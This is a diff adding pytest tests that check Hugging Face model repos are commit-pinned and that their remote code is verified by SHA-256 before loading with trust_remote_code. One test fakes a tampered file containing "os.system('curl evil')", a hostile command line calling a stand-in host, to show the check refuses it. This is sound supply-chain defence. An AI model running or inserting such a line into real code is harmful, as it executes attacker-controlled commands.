@@ -68,6 +68,84 @@ def test_pinned_pipeline_is_a_commit_and_sha256():
     assert len(enhance.PIPELINE_SHA256) == 64
 
 
+# ---- pinned model repos and their remote code -------------------------------------------------------
+
+
+def test_model_repos_are_pinned_to_commits():
+    assert set(enhance.REVISION) == set(enhance.MODEL) == set(enhance.REMOTE_CODE)
+    assert enhance.REVISION["difix"].startswith("2b0c6fb") and enhance.REVISION["difix-ref"].startswith("d483055")
+    for rev in enhance.REVISION.values():
+        assert len(rev) == 40 and int(rev, 16) >= 0
+    assert "vae/autoencoder_kl.py" in enhance.REMOTE_CODE["difix"]
+    assert "unet/unet_2d_condition.py" in enhance.REMOTE_CODE["difix-ref"]
+    for files in enhance.REMOTE_CODE.values():
+        assert "model_index.json" in files  # it decides which .py files diffusers imports
+        assert all(len(d) == 64 for d in files.values())
+
+
+def fake_hub(tmp_path, contents: dict[str, bytes]):
+    """A stand-in for hf_hub_download that serves `contents` and records each call."""
+    calls = []
+
+    def download(repo_id, filename, revision):
+        calls.append((repo_id, filename, revision))
+        p = tmp_path / "hub" / repo_id / revision / filename
+        p.parent.mkdir(parents=True, exist_ok=True)
+        p.write_bytes(contents[filename])
+        return str(p)
+
+    return download, calls
+
+
+def pin(monkeypatch, mode, contents):
+    monkeypatch.setitem(enhance.REMOTE_CODE, mode, {k: hashlib.sha256(v).hexdigest() for k, v in contents.items()})
+
+
+FILES = {
+    "model_index.json": b'{"vae": ["autoencoder_kl", "AutoencoderKL"]}',
+    "vae/autoencoder_kl.py": b"class A: ...\n",
+}
+
+
+def test_verify_remote_code_checks_every_file_at_the_revision(tmp_path, monkeypatch):
+    pin(monkeypatch, "difix", FILES)
+    download, calls = fake_hub(tmp_path, FILES)
+    got = enhance.verify_remote_code("difix", download)
+    assert sorted(got) == sorted(FILES)
+    assert calls == [("nvidia/difix", f, enhance.REVISION["difix"]) for f in FILES]
+
+
+def test_verify_remote_code_refuses_a_changed_file(tmp_path, monkeypatch):
+    pin(monkeypatch, "difix", FILES)
+    download, _ = fake_hub(tmp_path, {**FILES, "vae/autoencoder_kl.py": b"import os; os.system('curl evil')\n"})
+    with pytest.raises(SystemExit, match="vae/autoencoder_kl.py has SHA-256 .* Refusing"):
+        enhance.verify_remote_code("difix", download)
+
+
+def test_load_pipeline_verifies_before_from_pretrained(tmp_path, monkeypatch):
+    pin(monkeypatch, "difix-ref", FILES)
+    download, calls = fake_hub(tmp_path, FILES)
+    loaded = []
+
+    class Pipeline:
+        @classmethod
+        def from_pretrained(cls, repo, **kw):
+            assert len(calls) == len(FILES), "from_pretrained ran before the remote code was verified"
+            loaded.append((repo, kw))
+            return "pipe"
+
+    assert enhance.load_pipeline(Pipeline, "difix-ref", "fp16", download) == "pipe"
+    repo, kw = loaded[0]
+    assert repo == "nvidia/difix_ref" and kw["revision"] == enhance.REVISION["difix-ref"]
+    assert kw["trust_remote_code"] is True and kw["torch_dtype"] == "fp16"
+
+    bad, _ = fake_hub(tmp_path / "bad", {**FILES, "model_index.json": b"{}"})
+    loaded.clear()
+    with pytest.raises(SystemExit, match="model_index.json"):
+        enhance.load_pipeline(Pipeline, "difix-ref", "fp16", bad)
+    assert loaded == []  # never reached from_pretrained
+
+
 # ---- reference frame -------------------------------------------------------------------------------
 
 
